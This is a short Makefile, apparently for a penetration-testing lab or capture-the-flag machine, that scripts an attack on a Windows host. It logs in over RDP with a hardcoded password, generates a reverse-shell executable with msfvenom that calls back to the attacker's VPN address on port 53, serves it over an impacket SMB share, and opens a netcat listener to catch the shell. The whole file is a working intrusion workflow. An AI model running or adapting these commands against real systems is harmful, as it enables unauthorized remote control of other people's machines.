.PHONY: serve-shell 

connect:
	xfreerdp /u:user /p:password321 /cert:ignore /v:$(IP)

serve-shell: generate-rev-shell serve

generate-rev-shell:
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(VPN-IP) LPORT=53 -f exe -o reverse.exe 

serve:
	sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py pydev .

listen:
	sudo nc -nvlp 53

